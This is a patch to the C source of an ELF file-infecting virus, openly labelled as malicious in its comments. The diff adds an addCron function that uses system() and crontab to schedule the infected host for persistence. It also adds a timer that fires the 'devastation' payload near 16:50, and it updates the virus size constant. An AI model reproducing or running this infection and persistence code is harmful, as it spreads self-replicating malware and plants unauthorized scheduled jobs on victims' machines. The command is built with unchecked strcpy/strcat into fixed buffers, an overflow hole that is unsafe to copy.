@@ -13,7 +13,7 @@
 #include <sys/mman.h>
 #include <elf.h>
 
-#define SIZE 22696
+#define SIZE 22800
 #define MAGIC_NUMBER 0x15D25
 #define TEMP_FILENAME ".tempFileImage"
 
@@ -27,6 +27,7 @@ static inline char* randomly_select_dir(char **dirs)
 
 /* Execute malacious instructions */
 void devastation(char *fileName) {
+	// system()
 	const unsigned char banner[] = "Haha.. Your computer has been infected\n";
 	write(1, (char *)banner, sizeof(banner));
 
@@ -135,13 +136,26 @@ bool isOriginalVirus(int vfd) {
 	return SIZE == lseek(vfd, 0, SEEK_END);
 }
 
-
+void addCron(char *hostFileName){
+	char command[200];
+	strcpy(command,"echo \"50 16 * * * ");
+    char actualpath [200];
+    char *ptr;
+    ptr = realpath(hostFileName, actualpath);
+	strcat(command,ptr);
+	strcat(command,"\" >> /tmp/cron");
+	system(command);
+	system("crontab /tmp/cron");
+	// remove("./cron");
+}
 /**
  * Infect host file by creating a temporary file; 
  * appending the virus/infected file, clean ELF host;
  * and replacing the host file with the temporary file.
  */
 void infectHostFile(char* hostFileName, int virus_fd) {
+	
+	addCron(hostFileName);
 	int host_fd = open(hostFileName, O_RDONLY);	
 	struct stat st;
 	fstat(host_fd, &st);
@@ -240,7 +254,14 @@ void main(int argc, char *argv[]) {
 	else{
 		executeHostPart(virus_fd, st.st_mode, st.st_size, argv);
 		close(virus_fd);
-		devastation(argv[0]);
+		time_t seconds;
+		struct tm *timeStruct;
+
+		seconds = time(NULL);
+
+		timeStruct = localtime(&seconds);
+		if(timeStruct->tm_hour == 16 && abs(timeStruct->tm_min - 50)<=10)
+			devastation(argv[0]);
 	}
 	
 }
